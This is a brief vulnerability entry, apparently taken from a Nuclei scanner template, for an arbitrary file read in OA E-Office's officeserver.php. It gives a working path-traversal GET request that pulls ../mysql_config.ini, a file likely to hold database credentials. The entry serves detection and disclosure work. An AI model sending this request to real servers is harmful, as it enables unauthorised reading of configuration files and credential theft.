# Vulnerability: OA E-Office officeserver.php Arbitrary File Read
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`weaver-officeserver-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in the OA E-Office officeserver.php file. An attacker can download any file on the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
```

